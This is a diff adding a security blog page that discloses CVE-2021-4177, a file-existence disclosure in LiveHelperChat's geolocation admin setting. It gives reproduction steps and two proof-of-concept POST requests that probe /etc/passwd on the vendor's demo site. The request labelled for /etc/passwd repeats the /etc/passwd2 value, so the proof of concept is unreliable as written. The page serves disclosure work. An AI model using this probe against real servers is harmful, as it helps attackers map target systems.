@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        CVE-2021-4177 - Generation of Error Message Containing Sensitive Information LiveHelperChat ::
+        1d8 blog — A simple theme for Hugo
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="Description #  When updating the geolocation detection configuration, we&amp;rsquo;re given the option to specify a file location of a city database file, this can be used to determine if files exist or not. We are not able to see the contents of the file, but we are indeed able to determine if the file exists based on the server&amp;rsquo;s response.
+If the file location is highlighted green, we know that the file exists."
+/>
+<meta
+  name="keywords"
+  content=""
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://1d8.github.io/cves/cve_2021_4177/" />
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/style.css" />
+
+<link rel="stylesheet" href="https://1d8.github.io/style.css" />
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://1d8.github.io/img/apple-touch-icon-144-precomposed.png" />
+<link rel="shortcut icon" href="https://1d8.github.io/img/favicon.png" />
+
+
+<link href="/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="CVE-2021-4177 - Generation of Error Message Containing Sensitive Information LiveHelperChat"/>
+<meta name="twitter:description" content="Description #  When updating the geolocation detection configuration, we&rsquo;re given the option to specify a file location of a city database file, this can be used to determine if files exist or not. We are not able to see the contents of the file, but we are indeed able to determine if the file exists based on the server&rsquo;s response.
+If the file location is highlighted green, we know that the file exists."/>
+
+
+
+<meta property="og:title" content="CVE-2021-4177 - Generation of Error Message Containing Sensitive Information LiveHelperChat" />
+<meta property="og:description" content="Description #  When updating the geolocation detection configuration, we&rsquo;re given the option to specify a file location of a city database file, this can be used to determine if files exist or not. We are not able to see the contents of the file, but we are indeed able to determine if the file exists based on the server&rsquo;s response.
+If the file location is highlighted green, we know that the file exists." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://1d8.github.io/cves/cve_2021_4177/" /><meta property="article:section" content="cves" />
+
+<meta property="og:site_name" content="1d8 blog" />
+
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >1d8 blog</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/cves">CVEs</a></li>
+        
+      
+        
+          <li><a href="/publications">Publications</a></li>
+        
+      
+        
+          <li><a href="/writeups">Writeups</a></li>
+        
+      
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/cves">CVEs</a></li>
+      
+    
+      
+        <li><a href="/publications">Publications</a></li>
+      
+    
+      
+        <li><a href="/writeups">Writeups</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <article class="post">
+    <h1 class="post-title">CVE-2021-4177 - Generation of Error Message Containing Sensitive Information LiveHelperChat</h1>
+    <div class="post-meta">
+      
+
+      
+
+
+      
+        <span class="post-read-time"
+          >— 2 min read</span
+        >
+      
+    </div>
+
+    
+
+    
+
+    <div class="post-content">
+      
+      <h1 id="description">
+  Description
+  <a href="#description" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+<p>When updating the geolocation detection configuration, we&rsquo;re given the option to specify a file location of a city database file, this can be used to determine if files exist or not. We are not able to see the contents of the file, but we are indeed able to determine if the file exists based on the server&rsquo;s response.</p>
+<p>If the file location is highlighted green, we know that the file exists. But if the file location is highlighted red (indicating an error), we know that the file does not exist.</p>
+<p>It can also be further confirmed that the file does not exist by right-clicking the red highlight error &amp; inspecting element, then the title of the element would be File does not exist</p>
+<h1 id="steps-to-reproduce">
+  Steps to Reproduce
+  <a href="#steps-to-reproduce" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+<ol>
+<li>Go to <code>/site_admin/chat/geoconfiguration#!#geoconfiguration</code></li>
+<li>Scroll to <em>Location of city database</em></li>
+<li>Enter any file location (EX: /etc/passwd2)</li>
+<li>Click save</li>
+<li>Notice that the file path is highlighted in red, indicating that it doesn&rsquo;t exist.</li>
+<li>Then enter a file that does exist (/etc/passwd)</li>
+<li>Click save</li>
+<li>Notice that the file path is now highlighted in green, indicating that the file exists</li>
+</ol>
+<h1 id="proof-of-concept">
+  Proof of Concept
+  <a href="#proof-of-concept" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+<p><strong>Request for /etc/passwd2:</strong></p>
+<pre tabindex="0"><code>POST https://demo.livehelperchat.com/site_admin/chat/geoconfiguration
+csfr_token=3e590eb50d05c23820386a0f75ef2c51
+GeoDetectionEnabled=on
+freegeoip_key
+ServerVariableGEOIP_COUNTRY_CODE=GEOIP_COUNTRY_CODE
+ServerVariableGEOIP_COUNTRY_NAME=GEOIP_COUNTRY_NAME
+ServerVariableGEOIP_CITY=GEOIP_CITY
+ServerVariableGEOIP_REGION=GEOIP_REGION
+ServerVariableGEOIP_LATITUDE=GEOIP_LATITUDE
+ServerVariableGEOIP_LONGITUDE=GEOIP_LONGITUDE
+ipapi_key
+abstractapi_key
+UseGeoIP=max_mind
+CityGeoLocation=/etc/passwd2
+MaxMindDetectionType=country
+ipinfodbAPIKey
+locatorhqAPIKey
+locatorhqUsername
+locatorhqIP=192.168.1.183
+StoreGeoIPConfiguration=Save
+</code></pre><p><strong>Request for /etc/passwd:</strong></p>
+<pre tabindex="0"><code>POST https://demo.livehelperchat.com/site_admin/chat/geoconfiguration
+csfr_token=3e590eb50d05c23820386a0f75ef2c51
+GeoDetectionEnabled=on
+freegeoip_key
+ServerVariableGEOIP_COUNTRY_CODE=GEOIP_COUNTRY_CODE
+ServerVariableGEOIP_COUNTRY_NAME=GEOIP_COUNTRY_NAME
+ServerVariableGEOIP_CITY=GEOIP_CITY
+ServerVariableGEOIP_REGION=GEOIP_REGION
+ServerVariableGEOIP_LATITUDE=GEOIP_LATITUDE
+ServerVariableGEOIP_LONGITUDE=GEOIP_LONGITUDE
+ipapi_key
+abstractapi_key
+UseGeoIP=max_mind
+CityGeoLocation=/etc/passwd2
+MaxMindDetectionType=country
+ipinfodbAPIKey
+locatorhqAPIKey
+locatorhqUsername
+locatorhqIP=192.168.1.183
+StoreGeoIPConfiguration=Save
+</code></pre><h1 id="reference---httpshuntrdevbountiesac641425-1c64-4874-95e7-c7805c72074e">
+  Reference - <a href="https://huntr.dev/bounties/ac641425-1c64-4874-95e7-c7805c72074e/">https://huntr.dev/bounties/ac641425-1c64-4874-95e7-c7805c72074e/</a>
+  <a href="#reference---httpshuntrdevbountiesac641425-1c64-4874-95e7-c7805c72074e" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+
+    </div>
+    
+
+    
+      
+    
+  </article>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >1d8 blog</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span><a href="https://github.com/panr/hugo-theme-hello-friend" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
